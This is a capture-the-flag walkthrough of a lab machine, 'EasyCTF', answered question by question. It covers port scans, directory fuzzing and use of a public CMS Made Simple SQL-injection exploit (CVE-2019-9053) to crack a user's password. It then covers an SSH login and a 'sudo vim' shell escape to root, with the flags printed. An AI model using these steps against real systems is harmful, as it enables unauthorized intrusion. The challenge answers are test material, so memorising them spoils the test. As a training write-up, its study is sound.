Machine title EasyCTF
Machine IP 10.10.14.91

# 1
How many services are running under port 1000

`nmap -sS -Pn -p 1-1000 10.10.14.91`
and
`nmap -sU -Pn -p 1-1000 10.10.14.91`

```
└─$ sudo nmap -sS -Pn -p 1-1000 10.10.14.91
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 02:34 EDT
Nmap scan report for 10.10.14.91
Host is up (0.33s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 23.16 seconds
```
and
```
└─$ sudo nmap -sU -Pn -p 1-1000 10.10.14.91
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 02:35 EDT
Nmap scan report for 10.10.14.91
Host is up (0.37s latency).
Not shown: 998 open|filtered udp ports (no-response)
PORT   STATE  SERVICE
21/udp closed ftp
80/udp closed http

Nmap done: 1 IP address (1 host up) scanned in 40.57 seconds
```

Answer: `2`

# 2
What is running on the higher port?

```
└─$ sudo nmap -sS -Pn -p 21,80 -sV 10.10.14.91
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 02:40 EDT
Nmap scan report for 10.10.14.91
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.68 seconds    
```

But FTP isn't the higher port, and http doesn't match the answer mask, 3 characters.

```
└─$ nmap -p 1001-65535 -sC -T4 10.10.14.91
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 03:02 EDT
Nmap scan report for 10.10.14.91
Host is up (0.30s latency).
Not shown: 64534 filtered tcp ports (no-response)
PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)

Nmap done: 1 IP address (1 host up) scanned in 367.50 seconds

```

OK SSH is running on TCP 2222

Answer: `SSH`


# 3
What's the CVE you're using against the application?

```
─$ nmap -p 2222 -sC -sV -T4 10.10.14.91
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 03:09 EDT
Nmap scan report for 10.10.14.91
Host is up (0.39s latency).

PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.49 seconds

```



Looking for exploits for VSFTP 3.0.3, Apache 2.4.18 and OpenSSH 7.2p2 didn't give any real indication of a foot hold.

Checking http://10.10.14.91/robots.txt showed an entry for `Disallow: /openemr-5_0_1_3`

Looking for vulnerabilities for openemr 5.0.1.3 showed an authentication bypass as [CVE-2018-15152](https://packetstormsecurity.com/files/cve/CVE-2018-15152)

Run ffuf
```
└─$ ffuf -w /usr/share/wfuzz/wordlist/general/common.txt -u http://10.10.14.91/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.14.91/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wfuzz/wordlist/general/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 306ms]
    * FUZZ: simple

:: Progress: [951/951] :: Job [1/1] :: 130 req/sec :: Duration: [0:00:08] :: Errors: 0 ::

```

We can see the site http://10.10.14.941/simple

The site is running CMS Made Simple v 2.2.8

We can see an Unauthenticated SQL Injection [CVE-2019-9053](https://www.exploit-db.com/exploits/46635)

Answer: `cve-2019-9053`

# 4
To what kind of vulnerability is the application vulnerable?

Answer: `sqli`

# 5
What's the password?

The SQLI injection linked above is python2, looking for a python3 exploit found: 
https://github.com/e-renna/CVE-2019-9053

It requires a wordlist in utf-8 format so convert it

`└─$ iconv -f ISO8859-1 -t UTF8 /usr/share/dirb/wordlists/common.txt > utf8-common.txt`


Download and execute
`─$ python3 cve-2019-9053.py -u http://10.10.14.91/simple --crack -w utf8-common.txt`

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.h
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

Answer: `secret`

# 6
Where can you login with the details obtained?

Attempting to ssh into port 2222 failed, hanging the connection.
Enabling `-v` showed the last line as
`debug1: expecting SSH2_MSG_KEX_ECDH_REPLY`
Change the MTU on the VPN connection
`sudo ip li set mtu 1200 dev tun0`
Restart SSH now working as expected
`ssh -p 2222 mitch@10.10.14.91`

Answer: `ssh`

# 7
What's the user flag?

Answer: `G00d j0b, keep up!`


# 8
Is there any other user in the home directory? What's its name?
```
$ pwd
/home/mitch
$ cd ..
$ ls
mitch  sunbath
$ 

```

Answer: `sunbath`

# 9
What can you leverage to spawn a privileged shell?

Enumerating, running `sudo -l` shows we can run vim as root.

Answer: `vim`

# 10
What's the root flag?

[GTFOBin](https://gtfobins.github.io/gtfobins/vim/#shell) we can use VIM to get a shell
```
$ whoami
mitch
$ sudo vim -c ':!/bin/sh'

# ^[[2;2R^[]11;rgb:3333/3333/3333^G
/bin/sh: 1: ot found
/bin/sh: 1: 2R: not found
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
W3ll d0n3. You made it!

```

Answer: `W3ll d0n3. You made it!`
